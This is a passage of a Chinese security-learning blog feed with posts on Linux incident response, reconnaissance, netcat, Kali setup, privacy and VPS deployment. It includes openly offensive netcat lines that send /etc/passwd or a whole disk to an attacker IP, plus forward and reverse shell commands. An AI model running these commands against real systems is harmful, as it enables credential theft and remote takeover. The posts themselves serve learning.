系统保留，大多数情况下只能由root使用</p><p>1024-4999 由客户端程序自由分配</p><p>5000-65535 由服务端程序自由分配</p><h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><pre class=" language-Linux"><code class="language-Linux">chkconfig --level 2345 httpd on0 = 关机1 = 单用户2 = 有网络连接的多用户命令行模式3 = 无网络连接的多用户命令行模式4 = 不可用5 = 带图形界面的多用户模式6 = 重新启动chkconfig --list 查看服务自启动状态--del  删除</code></pre><h3 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h3><pre class=" language-Linux"><code class="language-Linux">rpm -Va 查看所有软件包的变化情况</code></pre><h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><blockquote><p>&#x2F;tmp<br>&#x2F;etc&#x2F;init.d<br>&#x2F;usr&#x2F;bin<br>&#x2F;usr&#x2F;sbin<br>&#x2F;root<br>&#x2F;boot<br>&#x2F;bin<br>&#x2F;sbin<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow</p></blockquote><pre class=" language-Linux"><code class="language-Linux">ls -alt 按时间排序find / *.py -perm 4777 查找所有777权限的py文件ls -al /tmp |grep "Feb 10" 寻找特定时间的文件</code></pre><h3 id="账号检查"><a href="#账号检查" class="headerlink" title="账号检查"></a>账号检查</h3><pre class=" language-Linux"><code class="language-Linux">w  查看某一时刻用户行为cat /etc/passwd 用户信息cat /etc/shadow 用户密码less /etc/passwd 查看有没有新用户删除:usermod -L [user]userdel [user]userdel -r [user]删除用户之后,/home目录下的用户名文件夹也删了last 查看成功的登录 /var/log.wtmplastb 登录失败情况 /var/log/btmplastlog 查看上一次用户登录情况 /var/log/lastloglast -x reboot 查看重启记录last -x shutdown 查看关机记录</code></pre><h3 id="历史命令检查"><a href="#历史命令检查" class="headerlink" title="历史命令检查"></a>历史命令检查</h3><blockquote><p>.bash_history</p></blockquote><pre class=" language-Linux"><code class="language-Linux">history 查看历史命令history -c 清空历史命令</code></pre><h3 id="其他检查"><a href="#其他检查" class="headerlink" title="其他检查"></a>其他检查</h3><pre class=" language-Linux"><code class="language-Linux">echo $PATH 环境变量cat /etc/hosts处置命令:chattr +i [目标文件]chmod 000 [目标文件]</code></pre><h3 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h3><blockquote><p>&#x2F;var&#x2F;log&#x2F;</p><p>日志配置文件</p><p>&#x2F;etc&#x2F;rsyslog.conf</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透工具使用</title>
      <link href="/2022/03/21/information-tool/"/>
      <url>/2022/03/21/information-tool/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集工具的使用"><a href="#信息搜集工具的使用" class="headerlink" title="信息搜集工具的使用"></a>信息搜集工具的使用</h1><p>bitvise远程连接kali</p><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><h3 id="windows本地信息搜集："><a href="#windows本地信息搜集：" class="headerlink" title="windows本地信息搜集："></a>windows本地信息搜集：</h3><pre class=" language-Linux"><code class="language-Linux">whoami   #查看自己身份whoami /all   #获取当前域的信息ipconfig /all     #查看详细ip信息arp -a     #查看arp表systeminfo    #查看操作系统信息echo %PROCESSOR_ARCHITECTURE%    #查看cpu型号wmic product get name,version  #查看安装软件和版本信息wmic qfe get Caption,Description,HotFixID,InstalledOn  #查看补丁列表net user  #查看本地用户net session  #显示本地和远程的会话wmic process list brief   #查看进程net view   #查看内网的共享</code></pre><h3 id="远程信息搜集："><a href="#远程信息搜集：" class="headerlink" title="远程信息搜集："></a>远程信息搜集：</h3><p>网站:<br><a href="http://seo.chinaz.com/">http://seo.chinaz.com/</a></p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p><strong>活跃主机识别</strong>：</p><pre class=" language-Linux"><code class="language-Linux">nmap -sP [网段]   ##活跃主机识别nping -tcp -p 445 -data [十六进制数据，例如0xab] [目标ip]    #对目标ip的445端口，以tcp的方式发送一串十六进制数据（可以通过以上方法模拟常见网络攻击，可以测试对方的防御效果）#zenmap就是nmap的图形界面版本nmap -sV [目标ip]   #服务指纹识别amap -bq [目标ip] [端口]    #服务枚举nc -nvz [ip] 1-65535    #使用windows的nc进行扫描</code></pre><h2 id="kali的nc加密传输"><a href="#kali的nc加密传输" class="headerlink" title="kali的nc加密传输"></a>kali的nc加密传输</h2><p>2 目标：</p><pre class=" language-Linux"><code class="language-Linux">cat /etc/passwd | base64 | nc -nv [黑客ip] 3333 -q 1#/etc/passwd敏感目录#/etc/shadow敏感目录#把查看到的结果进行base64加密，将结果通过nc连接黑客的3333端口，传完之后立马退出</code></pre><p>1 黑客：</p><pre class=" language-Linux"><code class="language-Linux">nc -l -p 3333 > kali.txt   #监听3333端口，并将监听到的东西存放到kali.txt里</code></pre><p><strong>传输文件</strong><br>2 目标：</p><pre class=" language-Linux"><code class="language-Linux">nc -nv [黑客ip] 3333 < [要传的文件] -q 1</code></pre><p>1 黑客:</p><pre class=" language-Linux"><code class="language-Linux">nc -lp 3333 > xx.txt</code></pre><h2 id="nc-远程克隆备份linux硬盘：【取证】"><a href="#nc-远程克隆备份linux硬盘：【取证】" class="headerlink" title="nc 远程克隆备份linux硬盘：【取证】"></a>nc 远程克隆备份linux硬盘：【取证】</h2><p>黑客（最好也是linux系统）：</p><pre class=" language-Linux"><code class="language-Linux">nc -lp 3333 | dd of=/dev/sda#o表示on方向，输出</code></pre><p>目标：</p><pre class=" language-Linux"><code class="language-Linux">dd if=/dev/sda | nc -nv [黑客ip] 3333 -q 1#i表示in方向，输入</code></pre><h2 id="nc-其他用法"><a href="#nc-其他用法" class="headerlink" title="nc 其他用法"></a>nc 其他用法</h2><p>两台linux系统：</p><p>适用于传输小的文件，whois也可以用于payload反弹 </p><p>目标 （没有nc，需要用合法方法传输）</p><pre class=" language-Linux"><code class="language-Linux">whois -h [黑客ip] -p 4444 `cat /etc/passwd | base64` </code></pre><p>黑客自己 </p><pre class=" language-Linux"><code class="language-Linux">nc -l -v -p 4444 | sed "s/ //g" | base64 -d #自己解码</code></pre><p><strong>注意</strong>：nc传输内容都是明文的</p><p>所以需要<strong>ncat</strong></p><h2 id="nc加密版ncat"><a href="#nc加密版ncat" class="headerlink" title="nc加密版ncat"></a>nc加密版ncat</h2><p><strong>ncat</strong>大多数情况在<strong>nmap</strong>的工具包里</p><p><code>--help</code>查看可用命令</p><p>目标(linux。如果是windows系统，bash改成cmd)：</p><pre class=" language-Linux"><code class="language-Linux">ncat -c bash --allow [黑客ip] -vnl 3333 --ssl  #只允许黑客的ip使用ssl加密去控制它</code></pre><p>黑客：</p><pre class=" language-Linux"><code class="language-Linux">ncat -nv [目标ip] 3333 --ssl </code></pre><h2 id="域环境："><a href="#域环境：" class="headerlink" title="域环境："></a>域环境：</h2><p>AD（active directiory）活动目录服务器</p><p>安装教程：<a href="https://www.cnblogs.com/cnjavahome/p/9029665.html">https://www.cnblogs.com/cnjavahome/p/9029665.html</a></p><p>exchange服务器</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试系统加渗透工具</title>
      <link href="/2022/03/21/Linux-system/"/>
      <url>/2022/03/21/Linux-system/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试系统以及渗透工具的了解"><a href="#渗透测试系统以及渗透工具的了解" class="headerlink" title="渗透测试系统以及渗透工具的了解"></a>渗透测试系统以及渗透工具的了解</h1><h2 id="入侵类操作系统"><a href="#入侵类操作系统" class="headerlink" title="入侵类操作系统"></a>入侵类操作系统</h2><p>承载工具比较多</p><p><strong>kali</strong></p><p>基于linux</p><p>一般安装方式：</p><p>1 通过install安装【但容易被追踪】</p><p>2 live光盘启动：iso光盘镜像——live方式启动，一切行为都是在内存里的，断电消失。</p><h3 id="linux权限"><a href="#linux权限" class="headerlink" title="linux权限"></a>linux权限</h3><p>kali2020以后<br><strong>用户名密码</strong>都是<strong>kali</strong></p><p>kali2019以下<br><strong>用户名root 密码toor</strong></p><pre class=" language-Linux"><code class="language-Linux">$   #普通用户权限sudo su   #提权命令\#    #root权限（机器&人类可用最高权限）</code></pre><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><p>分析\后门\逆向等常用工具 kali linux</p><p><img src="/2022/03/21/Linux-system/image-20220105143538507.png" alt="image-20220105143538507"></p><h3 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h3><pre class=" language-Linux"><code class="language-Linux">sudo su   #提权命令ifconfig  #查看ip地址whoami #查看自己是谁，当前用户pwd  #查看当前所在目录cd ..  #退一格（在linux的世界里/是最上层目录）.    #当前目录下ls  #查看当前目录ls -la  #查看详细信息mkdir test  #新建文件夹,名字叫testtouch 1.txt  #新建文件1.txtvi 1.txt   #使用vi编辑东西#vi是一个命令行编辑器#按下i进入insert模式#esc---:wq 保存退出 :q! 不保存退出cat 1.txt  #看一下1.txt内容tac 1.txt  #从后往前看一下1.txt内容cp [被复制的人] [复制的位置]   #复制mv [被剪切的人] [目标位置]     #剪切/改名rm [目标]   #删除rm -rf [目标]   #全部删除并且不询问（rm -rf /*  #危险命令-删库-强行删除根目录下所有内容）find [要在哪个地方查找] -name [查找的文件名]   #找东西ps   #查看进程（任务管理器）ps -ef   #查看所有进程top   #看进程（动态进程的任务管理器）ctrl+c   #结束ps -ef | grep [条件]  #筛选符合条件关键词的进程ps -ef | grep bash    #在所有进程里面查看名字叫bash的# | = 叫管道符,把左边命令执行的结果给右边echo   #回显，引号用于区分，不会echo haha > 1.txt     #在1.txt里写入haha（覆盖）echo haha >> 1.txt    #追加uname     #查看操作系统uname -a   #查看详细信息chmod [权限数字] [目标文件]   #修改权限chmod 755 -R [文件夹]     #修改文件夹内所有东西的权限防火墙service iptables start/stop #开启/关闭防火墙chkconfig iptables on/off #永久开启/关闭passwd 修改密码</code></pre><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><pre class=" language-Linux"><code class="language-Linux">d r-x r-x r-x 13 root root 0 Nov 3 11:22 sys   A   B   C       D    E                 Fd 文件夹- 文件l 链接r=read=4 w=write=2 x=execute=1A=所有者权限B=所有者所在组权限C=其他人权限D=所有人E=所有人所在的组F=文件名rwxr--r-x745</code></pre><h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><pre class=" language-Linux"><code class="language-Linux">vi /etc/ssh/sshd_config  #修改ssh</code></pre><blockquote><p>去掉Port 22前的#</p></blockquote><p><img src="/2022/03/21/Linux-system/image-20220105150042140.png" alt="image-20220105150042140"></p><blockquote><p>PermitRootLogin去掉前面#并确保yes</p></blockquote><p><img src="/2022/03/21/Linux-system/image-20220105150135686.png" alt="image-20220105150135686"></p><blockquote><p>PubKeyAuthentication去掉#并确保yes</p></blockquote><p><img src="/2022/03/21/Linux-system/image-20220105150241401.png" alt="image-20220105150241401"></p><blockquote><p>保证GSSAPI这三条前都是#</p></blockquote><p><img src="/2022/03/21/Linux-system/image-20220105150331688.png" alt="image-20220105150331688"></p><p>修改完后保存退出</p><pre class=" language-Linux"><code class="language-Linux">systemctl restart ssh/sshd   #重启ssh（新版）/etc/init.d/ssh restart      #（旧版）</code></pre><p>之后使用<strong>bitvise</strong>连接</p><h3 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h3><p>默认下载地址：</p><pre class=" language-Linux"><code class="language-Linux">/etc/apt/sources.list</code></pre><p>打开文件后将其更新源改为国内，比如阿里的：</p><p>（网上搜索kali更新源，复制粘贴下来上传到文件里）</p><pre class=" language-Linux"><code class="language-Linux">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</code></pre><p>然后让它自己更新一下：</p><pre class=" language-Linux"><code class="language-Linux">apt-get update   #更新</code></pre><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="安装beef"><a href="#安装beef" class="headerlink" title="安装beef"></a>安装beef</h4><pre class=" language-Linux"><code class="language-Linux">apt-get install beef-xss  #2019版本以后（老版本有）</code></pre><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>黑客的最终目标是控制目标电脑的cmd&#x2F;powershell</p><p>黑客的最终目标是控制目标电脑的cmd&#x2F;powershell</p><p>微软觉得cmd权限和可以做的事太少了就弄了一个powershell</p><p><strong>nc（瑞士军刀）</strong>（Windows和linux都可用的一个软件，用于控制目标电脑的cmd&#x2F;powershell）<br>开源</p><p><strong>netcat</strong></p><h5 id="nc的安装："><a href="#nc的安装：" class="headerlink" title="nc的安装："></a>nc的安装：</h5><p>kali自带，输入nc即可</p><p>Windows需要下载，解压后在当前目录下打开命令行，输入nc即可</p><h5 id="nc的使用："><a href="#nc的使用：" class="headerlink" title="nc的使用："></a>nc的使用：</h5><p>1 <strong>普通发送文字–互相通信</strong>：</p><p>服务端（被连接者）：</p><pre class=" language-Linux"><code class="language-Linux">nc -l -p 4444 #监听444端口</code></pre><p>客户端（连接者）：</p><pre class=" language-Linux"><code class="language-Linux">nc -nv [服务端ip] 4444  #连接服务端的444端口</code></pre><p>2 <strong>远程控制</strong>：</p><p><strong>正向控制</strong>：<br>目标：</p><pre class=" language-Linux"><code class="language-Linux">nc -lp 3333 -e cmd   #lp监听3333端口，如果有人连接我的3333端口，就把cmd反传给黑客执行</code></pre><p>黑客：</p><pre class=" language-Linux"><code class="language-Linux">nc -nv [目标Ip] 3333  #黑客就可以连接目标的cmd</code></pre><p><strong>反向控制</strong>：（大多数）<br>黑客：</p><pre class=" language-Linux"><code class="language-Linux">nc -lp 3333  #监听自己的3333端口</code></pre><p>目标：</p><pre class=" language-Linux"><code class="language-Linux">nc -nv [黑客ip] 3333 -e cmd   #连接黑客的3333端口并且执行了cmd</code></pre><p>如果是入侵linux系统，那么需要执行的是bash（等同于Windows的cmd） </p><pre class=" language-Linux"><code class="language-Linux">-c bash#等同于 -e cmd</code></pre><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><blockquote><p><code>nmap</code>全世界最厉害的扫描器：</p><p>主机发现<br>端口扫描<br>版本侦测<br>操作系统指纹识别</p></blockquote><pre class=" language-Linux"><code class="language-Linux">nmap [目标ip或目标网段192.168.1.0/24或目标网段192.168.1.1-24]   #普通扫描-sT    #tcp扫描，普通扫描nmap -sT [目标ip]-sS    #隐秘扫描(不形成三次握手)，不建立tcp连接，所以不会在防火墙上留下痕迹-sL [考虑扫一个网段]   #list scan列表扫描，主要用于主机发现nmap -sL 192.168.1.1-254-sn   #ping scan（ping扫描）只发现主机不扫描端口-Pn   #将所有主机都假定为开机，跳过主机发现过程-P0    #使用ip协议探测主机是否开启-sU    #使用udp扫描-p [指定扫描哪些端口]   -O    #识别操作系统</code></pre><p><a href="http://www.exploits-db.com/">www.exploits-db.com</a></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://chengzhaoxi.xyz/361d7ede.html">互联网算法工程开发常用技术</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>踪迹隐藏以及加密通讯了解</title>
      <link href="/2022/03/20/hidetrace-enc/"/>
      <url>/2022/03/20/hidetrace-enc/</url>
      
        <content type="html"><![CDATA[<h1 id="隐藏踪迹以及加密软件使用"><a href="#隐藏踪迹以及加密软件使用" class="headerlink" title="隐藏踪迹以及加密软件使用"></a>隐藏踪迹以及加密软件使用</h1><h2 id="个人防护-加密通讯"><a href="#个人防护-加密通讯" class="headerlink" title="个人防护 加密通讯"></a>个人防护 加密通讯</h2><blockquote><p>真实ip非常重要，要用一种方法对真实ip保护起来</p><p>CDN </p><p>cloudflare免费cdn</p><p>防止真实ip被人发现</p><p>流量缓存</p></blockquote><h3 id="个人信息泄露"><a href="#个人信息泄露" class="headerlink" title="个人信息泄露"></a>个人信息泄露</h3><p><strong>网络方面</strong></p><blockquote><p>大部分人都会泄露自己的公网ip</p><p>暴露ip就会暴露通信内容</p><p>加密（VPN）虚拟专用网络 （企业和企业之间进行通信）</p></blockquote><p><strong>个人软件方面</strong></p><blockquote><p>IM</p><p>qq  wx</p><p>某些软件会后台自动上传电脑的文件到服务器</p><p>某些杀毒软件：可以名正言顺对电脑进行扫描，搜集信息</p><p>某些国产浏览器，用浏览器可以用（chrome Firefox safari）</p><p>记得退出的时候清理痕迹</p><p>输入法</p></blockquote><h3 id="个人电脑"><a href="#个人电脑" class="headerlink" title="个人电脑"></a>个人电脑</h3><blockquote><p>操作系统（盗版）</p><p>邮件客户端 outlook exchange foxmail</p><p>（多用虚拟机）</p></blockquote><h3 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h3><blockquote><p>短信 SMS —&gt;2G &#x3D; 不加密（3-5G加密）</p><p>伪基站</p><p>Tor洋葱路由器</p></blockquote><h2 id="PGP加密"><a href="#PGP加密" class="headerlink" title="PGP加密"></a>PGP加密</h2><p><a href="http://www.gnupg.org/">http://www.gnupg.org</a></p><p><img src="/2022/03/20/hidetrace-enc/image-20220320211013105.png" alt="image-20220320211013105"></p><h2 id="EFS文件加密"><a href="#EFS文件加密" class="headerlink" title="EFS文件加密"></a>EFS文件加密</h2><p>只能windows使用</p><p><strong>证书加密</strong>（也非常安全）</p><p>你的磁盘必须为<strong>NTFS格式</strong>才可以使用EFS文件加密</p><h2 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a>软件加壳</h2><p>壳加密流量大多数不太星</p><p>通信流量的加密必须两边都认同加密方法才可以实现。</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 密码学 </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统以及公网服务器部署</title>
      <link href="/2022/03/20/server-system/"/>
      <url>/2022/03/20/server-system/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统以及公网服务器部署"><a href="#操作系统以及公网服务器部署" class="headerlink" title="操作系统以及公网服务器部署"></a>操作系统以及公网服务器部署</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p><strong>unix</strong>（开源、最安全）（C语言）</p><p><strong>Linux</strong>（目前大多数使用）</p><p><strong>DOS</strong>（当时是7.0）（比尔盖茨）</p><p>【当时以上无图形界面】</p><p><strong>macOS</strong>（闭源）（基于unix、linux）</p><p><strong>DOS–Windows</strong>（比尔盖茨）（闭源）</p><p><strong>Linux–Android</strong>（java虚拟机在上面跑程序）</p><p><strong>macOS–iOS</strong>（挂起）（推送机制）</p><p>【“深度定制”——硬件的缺陷不能用软件来弥补：</p><p>游戏机（流畅）和电脑跑游戏机模拟器（卡）速度区别】</p><p><strong>闭源</strong>：黑盒测试（推断程序员会在哪个地方偷懒）</p><p><strong>开源</strong>：白盒测试（<strong>代码审计</strong>–对代码漏洞进行审查）</p><h2 id="公网上部署服务器"><a href="#公网上部署服务器" class="headerlink" title="公网上部署服务器"></a>公网上部署服务器</h2><p>你有一个idea-&gt;用程序写出来-&gt;放在互联网上-&gt;怎么做？</p><p>vps（虚拟服务器）</p><p><strong>虚拟化</strong>：</p><p><img src="/2022/03/20/server-system/220104.png" alt="220104"></p><p><strong>云计算</strong>：</p><p><img src="/2022/03/20/server-system/220104-2.png" alt="220104-2"></p><h2 id="租vps"><a href="#租vps" class="headerlink" title="租vps"></a>租vps</h2><p>网址：vultr.com</p><blockquote><p>products -&gt;cloud compute-&gt;可以选择日韩等中国使用来较快-&gt;64 bit OS-&gt;55GB SSD-&gt;centOS -&gt;安装</p><p>然后会分配给我们一个ip地址</p><p>我们需要连接这台服务器：</p><p>Windows，需要远程桌面连接（默认情况下用户名administrator）</p><p>linux，ssh连接（用户名root）</p><p>个人建议使用bitvise连接。</p></blockquote><p>使用bitvise ssh client工具里的bvssh.exe点开。</p><p><img src="/2022/03/20/server-system/image-20220104184959423.png" alt="image-20220104184959423"></p><p>把租到的服务器的IP、用户名、密码输入到其中</p><p><img src="/2022/03/20/server-system/image-20220104185054212.png" alt="image-20220104185054212"></p><p>点击login，然后就可以使用公网的一个linux的服务器了</p><p><img src="/2022/03/20/server-system/image-20220104185158233.png" alt="image-20220104185158233"></p><h2 id="宝塔面板管理服务器"><a href="#宝塔面板管理服务器" class="headerlink" title="宝塔面板管理服务器"></a>宝塔面板管理服务器</h2><pre class=" language-Linux"><code class="language-Linux">ifconfig  # 查看ipwhoami            # 查看当前登录的用户安装一个网站管理系统宝塔面板bt.cnyum install -y wget && wget -O install.sh http://download.bt.cn/install/install_6.0.sh && sh install.sh安装完成后需要复制：外网面板地址：[]username：[]password：[]然后就可以关闭服务器了，可以选择保存or不保存。</code></pre><blockquote><p>通过访问刚刚保存的外网面板地址登录宝塔面板的后台，输入用户名和密码。</p><p>然后如下操作<strong>安装LAMP组合</strong>：</p><p><img src="/2022/03/20/server-system/image-20220104191219280.png" alt="image-20220104191219280"></p><p>然后还需要<strong>注册一个域名</strong>，使域名指向你服务器的ip地址。</p><p>注册域名推荐网站：<a href="http://www.namecheap.com/">www.namecheap.com</a></p><p>搜索想要注册的域名 》选择相对便宜的后缀 》注册购买 》注册好后选择管理 </p><p><img src="/2022/03/20/server-system/image-20220104192616534.png" alt="image-20220104192616534"></p><p>勾选上，然后进入advanced DNS，将原有的type删除</p><p><img src="/2022/03/20/server-system/image-20220104192713205.png" alt="image-20220104192713205"></p><p>然后add new record，比如用www、@解析我们宝塔上得到的外网面板地址：</p><p><img src="/2022/03/20/server-system/image-20220104192841246.png" alt="image-20220104192841246"></p><p><img src="/2022/03/20/server-system/image-20220104192956407.png" alt="image-20220104192956407"></p><p>然后进入安装好LAMP的宝塔面板：</p><p>进入网站 》添加站点 》输入注册好的域名 》数据库选择MySQL 》<strong>记录下数据库的用户名和密码</strong></p><p><img src="/2022/03/20/server-system/image-20220104193356328.png" alt="image-20220104193356328"></p><pre class=" language-base"><code class="language-base">数据库用户名：[]数据库密码：[]</code></pre><p><strong>http—-&gt;https</strong></p><p>宝塔面板里面给自己的网站安装一个ssl，这样网站会变成https</p><p>大多数人是租阿里云的vps去赚钱等。</p></blockquote><h2 id="内网安装一个网站"><a href="#内网安装一个网站" class="headerlink" title="内网安装一个网站"></a>内网安装一个网站</h2><p>首先需要确保能ping到这个网站</p><p>然后在宝塔面板的文件里进行相关操作布置一些网站。</p><p>宝塔面板的文件目录 即相当于本地PHPstudy为例的www文件目录</p><p>宝塔面板的数据库也是在LAMP安装过程中已安装好的，在phpmyadmin面板。</p><blockquote><p>使用phpstudy-&gt;Apache 、MySQL-&gt;文件根目录即www文件目录-&gt;数据库面板也是使用PHPmyadmin，通过访问127.0.0.1&#x2F;phpmyadmin&#x2F;，然后登录root，root。</p></blockquote><h2 id="从公网上安装一个网站："><a href="#从公网上安装一个网站：" class="headerlink" title="从公网上安装一个网站："></a>从公网上安装一个网站：</h2><p>因为搭建网站都是从php上搭建，所以可以搜索php源码，找到想搭建的网站的源代码，下载后down在我们的网站根目录下，然后再访问域名就会出现下载的网站的安装首页。</p><p>关于可读可写：</p><pre class=" language-Linux"><code class="language-Linux">也可以进入www目录下cd /wwwlscd wwwrootchmod 777 -R 刚刚注册的域名# 修改文件的权限为777 [root@localhost ~]# chmod 777 file # 修改文件夹以及文件夹内部文件的权限为777[root@localhost ~]# chmod 777 -R file</code></pre><p><img src="/2022/03/20/server-system/image-20220104195718738.png" alt="image-20220104195718738"></p><p><strong>本地PHPstudy</strong>：用户名和密码都是root，网站的数据库名需要在PHPmyadmin里新建一个文件名为数据库名。</p><p><strong>宝塔</strong>：记录下来的用户名和密码，数据库名改为宝塔里的数据库名。</p><p>然后安装网站完成后，即可登录进入网站前台or后台。</p><p>over</p><p><strong>注</strong>：学会安装网站后，学会一些更改前端的操作，然后就可以进行一些网站建设。（猪八戒zbj.com上接单）</p><h2 id="关于vps"><a href="#关于vps" class="headerlink" title="关于vps"></a>关于vps</h2><p>比如<strong>阿里云的vps</strong>：</p><p>云服务器ecs</p><p>比如企业级的计算型，用于做游戏私服等</p><p><strong>选择vps的时候</strong>：</p><p>有些vps厂商会让你选择线路</p><p>CN2中国下一代承载网，支持qos（服务质量），让重要数据包先走，比传统的163线路（中国第一代承载网）强。【一些中国人在国外常使用】</p><p>CN2GT，便宜，网络拥堵</p><p>CN2GIA，贵，质量好</p><p>BGP多线机房，自动识别运营商，不同网络自动切换</p><p>GCP谷歌公司的线路，贵，质量超级好</p><p>AWS亚马逊线路，流量太少</p><p>Azure微软线路，慢，中规中矩</p><p>PCCW香港线路，贵，网络发达</p><p>IPLC国际私有租用线路（专线），极贵，带宽小流量低，不用翻墙直接墙外，不会通过GFW审查</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/03/23/system-passwd/">操作系统权限及信息采集</a></li><li><a href="http://broken-year.github.io/2022/03/21/Linux-system/">渗透测试系统加渗透工具</a></li><li><a href="https://chengzhaoxi.xyz/fca64d0c.html">【回炉】理解Unix进程-1</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 服务器搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> vps </tag>
            
            <tag> 服务器搭建 </tag>
            
            <tag> 公网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php入门</title>
      <link href="/2022/03/20/php-introduction/"/>
      <url>/2022/03/20/php-introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="php入门"><a href="#php入门" class="headerlink" title="php入门"></a>php入门</h1><blockquote><p>新建一个index.php</p><p>index是标准的网页首页命名</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"haha nihao"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><blockquote><p>php代码代码必须使用<?php xxxx    ?></p></blockquote><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><blockquote><p>php是一种弱类型语言</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token 